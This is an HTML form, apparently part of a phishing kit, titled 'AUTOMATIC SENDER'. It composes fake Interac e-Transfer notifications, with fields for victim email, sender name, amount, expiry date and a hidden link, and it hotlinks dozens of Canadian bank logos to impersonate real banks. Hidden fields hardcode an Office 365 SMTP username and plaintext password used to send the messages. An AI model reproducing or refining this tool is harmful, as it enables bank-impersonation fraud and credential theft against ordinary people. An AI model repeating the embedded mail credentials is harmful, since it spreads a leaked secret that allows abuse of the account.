<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      background-color: #000;
      color: #fff;
      font-family: Arial, sans-serif;
    }

    h1 {
      text-align: center;
    }

    form {
      margin: 20px;
    }

    input[type="text"], select {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
      border: none;
      background-color: #333;
      color: #fff;
    }

    input[type="submit"] {
      width: 100%;
      padding: 10px;
      border: none;
      background-color: #0066cc;
      color: #fff;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <form action="submit1.php" method="POST" enctype="multipart/form-data">
    <h1>AUTOMATIC SENDER</h1>
<input type="hidden" name="shortlink" value="" required="">
<input type="text" name="receiver_email" placeholder="receivers email" value="swiftrynx@gmail.com" required="">
<input type="text" name="receiver_name" placeholder="receivers name" value="One Time Contact" required="">
<input type="text" name="sender_name" placeholder="sender name" value="TRIPLE-X OILFIELD LTD" required="">
<input type="text" name="amount" placeholder="100.00" value="200.00" step="0.01" required="">
<input type="text" name="expiredate" placeholder="May 8,2023" value="June 23,2023" required="">
<center><select name="photo_link" id="photo_link">
<option value="https://etransfer-content.interac.ca/en/logo_CA000002.png">Scotiabank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000001.png">BMO</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000003.png">RBC</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000010.png">CIBC</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000219.png">ATB Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000004.png">TD</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000292.png">National Bank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000045.png">Desjardins</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000118.png">Laurentian Bank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000062.png">HSBC</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000344.png">Simplii Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000007.png">Tangerine</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000308.png">EQ Bank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000310.png">Motusbank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000315.png">FirstOntario Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000238.png">Meridian Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000343.png">Manulife Bank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000346.png">Motive Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000324.png">Alterna Savings</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000210.png">Bridgewater Bank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000311.png">Oaken Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000341.png">Zag Bank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000016.png">President's Choice Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000217.png">Servus Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000314.png">Westminster Savings Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000325.png">Christian Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000331.png">Vancity Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000332.png">Valley First Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000338.png">Mountain View Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000345.png">Connect First Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000071.png">ICICI Bank Canada</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000129.png">National Bank Direct Brokerage</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000174.png">Caisse Financial Group</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000188.png">State Bank of India (Canada)</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000205.png">Bridgeway National</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000212.png">AcceleRate Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000239.png">First Calgary Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000244.png">Tandia Financial Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000254.png">DUCA Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000256.png">Envision Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000271.png">Interior Savings Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000279.png">Kindred Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000290.png">Northern Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000309.png">Steinbach Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000326.png">Synergy Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000340.png">Your Neighbourhood Credit Union</option>
</select><select name="bank" id="bank">
      <option value="Scotia Bank">Scotia Bank</option>
      <option value="Bank of Montreal">Bank of Montreal</option>
      <option value="CIBC">CIBC</option>
      <option value="RBC Royal Bank">RBC Royal Bank</option>
      <option value="ATB Financial">ATB Financial</option>
      <option value="TD Canada Trust">TD Canada Trust</option>
      <option value="HSBC Bank Canada">HSBC Bank Canada</option>
      <option value="National Bank of Canada">National Bank of Canada</option>
      <option value="Desjardins">Desjardins</option>
      <option value="Laurentian Bank of Canada">Laurentian Bank of Canada</option>
      <option value="Manulife Bank of Canada">Manulife Bank of Canada</option>
      <option value="Tangerine Bank">Tangerine Bank</option>
      <option value="Alterna Bank">Alterna Bank</option>
      <option value="Bridgewater Bank">Bridgewater Bank</option>
      <option value="Canadian Tire Bank">Canadian Tire Bank</option>
      <option value="Equitable Bank">Equitable Bank</option>
      <option value="First Nations Bank of Canada">First Nations Bank of Canada</option>
      <option value="Haventree Bank">Haventree Bank</option>
      <option value="Motus">Motusbank</option>
      <option value="Peoples Trust Company">Peoples Trust Company</option>
      <option value="Simplii Financial">Simplii Financial</option>
      <option value="Vancity">Vancity</option>
    </select><br><input type="submit" value="Submit"></center>

<input type="hidden" name="port" value="587" required="">
<input type="hidden" name="username" value="info@supportdrone.ca" required="">
<input type="hidden" name="password" value="Covidabc2020" required="">
<input type="hidden" name="host" value="smtp.office365.com" required="">


</fieldset></form></body></html>